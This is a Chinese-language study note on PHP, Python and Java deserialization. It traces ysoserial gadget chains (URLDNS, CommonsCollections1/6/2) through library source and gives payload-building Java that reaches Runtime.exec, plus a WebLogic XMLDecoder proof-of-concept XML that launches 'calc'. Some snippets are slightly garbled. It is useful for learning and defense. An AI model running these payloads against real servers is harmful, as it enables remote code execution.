# PHP 反序列化

PHP中序列化一个对象需要调用serialize()方法，之后会调用__sleep()方法执行自定义操作后，序列化数据生成，而JAVA的wrireObject()是可以重写的。反序列化后会调用__wakeup()方法。

PHP中的魔术方法__sleep(),__wakeup()是在序列化操作的前后执行而不是序列化时。

PHP反序列化漏洞的利用点是在序列化时将一些属性修改成我们想要的数据 ，从而在之后的执行流程中进行危险操作，而不是在__wakeup()中，因为根本不可控，除非__wakeup()本身写的很危险

# Python 反序列化

Python反序列化和Java、PHP有个显著的区别，就是Python的反序列化过程实际上是在执行一个基于栈的虚拟机。

我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序。

# Java Serializable 反序列化

Java的反序列化和PHP的反序列化其实有些类似，都是将一个对象中的属性按照某种特定的格式生成一段数据流。
在反序列化的时候再按照这个格式将属性取出，再赋值给新的对象。

在序列化是会调用writeObject()，参数是ObjectOutSteam类型。

我们可以将任何数据写入这个对象输出流，在反序列化是调用重写好的readObject()来读取前面写入的内容，比PHP序列化操作更自定义

## URLDNS

urldns利用链并不能执行命令而是发起一次DNS查询，传递的payload是url，但是在检测反序列化漏洞存在与否很方便

 - 不能确定目标服务器上JDK，commons-collections等库的版本，urldns利用链有内置类构造
 - 目标服务器没有回显时，就很方便

ysoserial工具就有URLDNS的gadget chain:

```java 
public Object getObject(final String url) throws Exception {

        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, url, handler); // URL to use as the Key
        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        Reflections.setFieldValue(u, "hashCode", -1); 
        // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
        //在上述放置期间，将计算并缓存URL的hashCode。这将重置，以便下次将hashCode称为DNS查找时将被触发

        return ht;
}

```

> 注释中写道 进行hashcode操作时会触发一次DNS请求

 ysoserial源码的URLDNS类的getObject方法返回将要被序列化的类HashMap

将java.net.URl对象作为key，url作为value放入HashMap对象中

 HashMap的readObejct()代码：

 ```java
    private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
        // Read in the threshold (ignored), loadfactor, and any hidden stuff
        s.defaultReadObject();
        reinitialize();
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new InvalidObjectException("Illegal load factor: " + loadFactor);
        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0)
            throw new InvalidObjectException("Illegal mappings count: " + mappings);
        else if (mappings > 0) { // (if zero, use defaults)
            // Size the table using given load factor only if within
            // range of 0.25...4.0
            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
 ```

对放入的key进行hash计算`putVal(hash(key), key, value, false, false);`

```java
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
```

计算hash过程中调用key也就是URL对象的`hashcode()`方法

```java
    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```

触发DNS请求在`handler.hashCode(this)`内，handler是抽象类`URLStreamHandler`的子类

这里需要hashCode为-1是才会触发handler.hashCode()，在序列化生成payload时将url对象put到HashMap时会进行一次hashcode计算

所以需要使用反射在put操作后手动修改url对象的hashCode值为-1

```java
Class clazz = url.getClass();
Field f = clazz.getDeclaredField("hashCode");
f.setAccessible(true);
f.set(url,-1);
```

URLStreamHandler类的hashCode方法这里调用`getHostAddress()`触发DNS

```java
protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u);
        if (addr != null) {
            h += addr.hashCode();
        } else {
            String host = u.getHost();
            if (host != null)
                h += host.toLowerCase().hashCode();
        }

        // Generate the file part.
        String file = u.getFile();
        if (file != null)
            h += file.hashCode();

        // Generate the port part.
        if (u.getPort() == -1)
            h += getDefaultPort();
        else
            h += u.getPort();

        // Generate the ref part.
        String ref = u.getRef();
        if (ref != null)
            h += ref.hashCode();

        return h;
    }
```


> ysoserial防止在生成payload是触发请求，所以重写了handle-SilentURLStreamHandler

## commons-collections-3.1

### TransformedMap调用链

```java
    public static void main(String[] args) {
        String cmd  = "open /System/Applications/Calculator.app";
        String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, 
                new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(null);

        //创建AnnotationInvocationHandler对象 对map.class的动态代理对象
        Map map = new HashMap();

        Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        transformedMap.put("key","value");

//        for (Object obj : transformedMap.entrySet()) {
//            Map.Entry entry = (Map.Entry) obj;
//
//            // setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
//            entry.setValue("test");
//        }
```

#### ChainedTransformer

实现Transform接口的一个类，构造时传入Transform列表，他的transform()方法将构造时传入的数组穿起来

前一个的返回结果作为下一个的参数

```java
    public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }
        return object;
    }
```

#### ConstantTransformer

也是实现了tansformer接口的类，构造时传入一个对象并保存在iConstant属性，在调用transform()时将这个对象返回

```java
    public ConstantTransformer(Object constantToReturn) {
        this.iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return this.iConstant;
    }
```

#### InvokerTransformer

同样是实现Transform接口的类，构造时传入方法名，参数类型和参数值，调用transform()时传入被调用对象

InvokerTransformer类的transform方法导致命令执行：

```java
    public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var7) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            }
        }
    }
```

### 生成可利用的序列化数据：


```java
        Class ann_clazz = Class.forName(ANN_INV_HANDLER_CLASS);

        // 获取AnnotationInvocationHandler类的构造方法
        Constructor constructor = ann_clazz.getDeclaredConstructor(Class.class, Map.class);

        // 设置构造方法的访问权限
        constructor.setAccessible(true);

        //AnnotationInvocationHandler类实例
        Object instance = constructor.newInstance(Target.class, transformedMap);

        // 创建用于存储payload的二进制输出流对象 创建Java对象序列化输出流对象
        ObjectOutputStream out = new ObjectOutputStream(new ByteArrayOutputStream());
        out.writeObject(instance);
        out.flush();
        out.close();

        byte[] bytes = baos.toByteArray();

        // 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
        ObjectInputStream in = new ObjectInputStream(banew ByteArrayInputStream(bytes)is);

        in.readObject();
        in.close();

    }
}
```

#### AnnotationInvocationHandler

AnnotationInvocationHandler类的构造函数有两个参数，第⼀个参数是⼀个Annotation类；第⼆个是参数就是前⾯构造的Map

> AnnotationInvocationHandler类是私有类，不能直接new出来。


调用TransformedMap的setValue/put/putAll中的任意方法都会调用InvokerTransformer类的transform方法，就会触发命令执行

- 可以触发此调用链的场景

 - 只要在Java的API中的任何一个类实现了java.io.Serializable接口
 - 可以传入构建的TransformedMap对象
 - 要有调用TransformedMap中的setValue/put/putAll中的任意方法一个方法的类
 - 在Java反序列化的时候触发InvokerTransformer类的transform方法实现RCE

 > 在jdk1.7u80中调用链可以顺利执行，jdk1.8u71之后AnnotationInvocationHandler类的readobject()中没有调用entrty.setValue()方法。无法执行，代码如下。


- 1.7
```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();

        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    //这里调用的setValue()->checkSetValue()->valueTransformer.transform(value)
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }

    }

```

- 1.8

```java
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        GetField var2 = var1.readFields();
        Class var3 = (Class)var2.get("type", (Object)null);
        Map var4 = (Map)var2.get("memberValues", (Object)null);
        AnnotationType var5 = null;

        try {
            var5 = AnnotationType.getInstance(var3);
        } catch (IllegalArgumentException var13) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var6 = var5.memberTypes();
        LinkedHashMap var7 = new LinkedHashMap();

        String var10;
        Object var11;
        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
            Entry var9 = (Entry)var8.next();
            var10 = (String)var9.getKey();
            var11 = null;
            Class var12 = (Class)var6.get(var10);
            if (var12 != null) {
                var11 = var9.getValue();
                if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) {
                    //zheli 
                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
                }
            }
        }

        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);
        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);
    }
```

### LazyMap调用链 ysoserial-CommonsCollections1 

Lazy触发点和TransformedMap不同，TransformedMap触发转换是在设置值时，而LazyMap是在get操作时没有找到对应的值时会调用transform返回一个转换后的对象，后半段执行命令的利用链和上面的一致，不同的是触发方式,创建一个lazyMap：

```java
Map lm = LazyMap.decorate(innerMap,chainedTransformer);
```

AnnotationInvocationHandler类的readObject()没有调用LazyMap的get方法，但是在invoke中有调用，invoke会在代理对象被访问时调用

AnnotationInvocationHandler实现了InvocationHandler接口，可以作为代理对象的handler，创建一个代理对象

```java
Class ann_clazz = Class.forName(ANN_INV_HANDLER_CLASS);
    Constructor constructor = ann_clazz.getDeclaredConstructor(Class.class, Map.class);
    constructor.setAccessible(true);
    InvocationHandler ih = (InvocationHandler) constructor.newInstance(Target.class, lm);

    Map proxymap = (Map) Proxy.newProxyInstance(lm.getClass().getClassLoader(),new Class[]{Map.class},ih);
```

上面的代理对象时map类型，需要用AnnotationInvocationHandler包裹，将这个map作为AnnotationInvocationHandler的memberValue参数：

```java
InvocationHandler aih = (InvocationHandler) constructor.newInstance(Target.class, proxymap);
```

> LazyMap利用链在jdk1.8u71版本后不能成功执行命令，原因是sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变了

### TiedMapEntry ysoserial-CommonsCollections6

工具的CommonsCollections6解决jdk版本限制，利用链如下：

```java
/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaisercommons-collections:commons-collections:3.1
*/
```

利用链的后半部分org.apache.commons.collections.map.LazyMap.get()开始是上面的利用链，前半部分则使用了TiedMapEntry类来触发，源码如下：    


```java
public class TiedMapEntry implements Entry, KeyValue, Serializable {
    private static final long serialVersionUID = -8453869361373831205L;
    private final Map map;
    private final Object key;

    public TiedMapEntry(Map map, Object key) {
        this.map = map;
        this.key = key;
    }

    public Object getKey() {
        return this.key;
    }

    public Object getValue() {
        return this.map.get(this.key);
    }

    public Object setValue(Object value) {
        if (value == this) {
            throw new IllegalArgumentException("Cannot set value to this map entry");
        } else {
            return this.map.put(this.key, value);
        }
    }

    public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKy().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }
}
```

上面写过LazyMap#get()方法调用时会触发transform导致命令执行，在TiedMapEntry#getValue中调用了Map的get方法

而属性map是在构建TiedMapEntry对象的传入的参数，在TiedMapEntry#hashCode中调用了TiedMapEntry#getValue

这里和urldns利用链的前半部分一样了，HashMap#hash中调用了hashCode方法，而HashMap#readObject调用了hash

```java
        String cmd = "open /System/Applications/Calculator.app";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };


        Transformer[] fake_transformers = new Transformer[]{new ConstantTransformer(1)};
        ChainedTransformer chainedTransformer = new ChainedTransformer(fake_transformers);

        Map innerMap = new HashMap();


        Map outerMap = LazyMap.decorate(innerMap,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"key");

        Map serMap = new HashMap();
        serMap.put(outerMap,"value");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer,transformers);
```

LazyMap#get中触发transform方法之前存在判断：

```java
    public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
}
```



未完。

### xx

ysoserial CommonsCollections2调用链

```java
/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */
```


##  Weblogic

weblogic支持部署大型分布式应用，同时是管理和配置整个域中所有资源的中心点，包括web server，web应用程序和资源jdbc或者DataSource

weblogic本身就是分布式设计程序，可以部署weblogic集群来协同工作有更好的伸缩性也更可靠，有集群，也就存在集群间的通信和数据同步，大部分weblogic漏洞都发现在这里

WebLogic版本众多，经常见到的只有两个类别：10.x和12.x，这两个大版本也叫WebLogic Server 11g和WebLogic Server 12c。

- Oracle WebLogic Server 10.3.6 支持的最低JDK版本为JDK1.6
- Oracle WebLogic Server 12.1.3 支持的最低JDK版本为JDK1.7
- Oracle WebLogic Server 12.2.1 12.2.1及以上支持的最低JDK版本为JDK1.8
- Oracle WebLogic Server 12.2.1.1
- Oracle WebLogic Server 12.2.1.2
- Oracle WebLogic Server 12.2.1.3

在上面的众多反序列化中，不同的jdk版本他的利用链也不一样，在不同的weblogic版本中引用的依赖jar包版本也不尽相同，就很讨厌

### XMLDecoder 反序列化漏洞

#### XMLDecder简介

XMLDecoder是Philip Mine 在 JDK 1.4 中开发的一个用于将JavaBean或POJO对象序列化和反序列化的一套API，开发人员可以通过利用XMLDecoder的readObject()方法将任意的XML反序列化，从而使得整个程序更加灵活。

XMLDecoder使用的是SAX解析规范，在调用readObject()后会使用`SAXParserFactory`工厂生成SAXParser实例，在调用`SAXParser.parse()`中初始化DocumentHandler用于解析xml数据流，DocumentHandler继承与DefaultHandler，weblogic中默认的解析xml和创建事件的handle。XMLDecoder在com.sun.beans.decoder实现了DocumentHandler，其中定义各种标签对应的处理器handle，用于构造反序列化poc的元素。

```xml
// weblogic xmldecoder反序列化漏洞poc 最初的poc版本没有任何过滤
<java>
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="1">
            <void index="0">
                <string>calc</string>
            </void>
        </array>
        <void method="start"/>
    </object>
</java>

```

##### object标签

处理类是`ObjectElementHandler`类，继承于NewElementHandler类用于加载一个对象，存在object标签的class属性时，会调用父类NewElementHandler的`addAttribute()`寻找class属性值`java.lang.ProcessBuilder`的class对象引用到`ObjectElementHandler`的`type`属性

##### array标签

用于常见一个arraylist数组，作为父标签的参数

##### void标签

处理器类为VoidElementHandler类，继承于ObjectElementHandler类，且只重写了isArgument方法。这里设置method属性

![path](https://nanazeven.github.io/image/xmldecoder1.png)

结束void标签是调用VoidElementHandler的endElement函数。由于继承关系：voidElementHandler->objectElementHandler->newElementHandler->ElementHandler，调用的ElementHandler的endElement后调用newendElement的getValueObject函数，最终调用objectElementHandler的getValueObject函数：


在objectElementHandler的getValueObject函数中调用getContentBean函数获取class对象

![path](https://nanazeven.github.io/image/xmldecoder2.png)

上面的geContentbean会调用父节点也就是object的getValueObjec函数，这里通过创建Expression对象创建了java.lang.ProcessBuilder的对象并返回


之后再次回到void标签处理器实例的getValueObjec函数，通过Expression执行start函数

![path](https://nanazeven.github.io/image/xmldecoder3.png)



